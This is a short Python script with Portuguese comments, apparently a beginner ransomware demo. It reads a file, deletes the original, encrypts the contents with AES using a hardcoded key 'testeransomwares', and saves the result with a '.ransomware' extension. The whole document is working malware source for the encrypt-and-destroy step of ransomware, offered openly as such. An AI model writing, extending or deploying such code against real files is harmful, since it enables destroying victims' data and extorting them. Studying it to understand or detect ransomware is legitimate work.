# abrir arquivo criptografado

import os
import pyaes

file_name = 'teste.txt'
file = open(file_name, 'rb')
file_data = file.read()

# remover arquivo original

os.remove(file_name)

# definir a chave de encriptografia

key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCRT(key)

# criptografar arquivo

crypto_data = aes.encrypt(file_data)

# salvar arquivo criptografado

new_file = file_name + '.ransomware'
new_file = open(f'{new_file}','wb')
new_file.write(crypto_data)
new_file.close()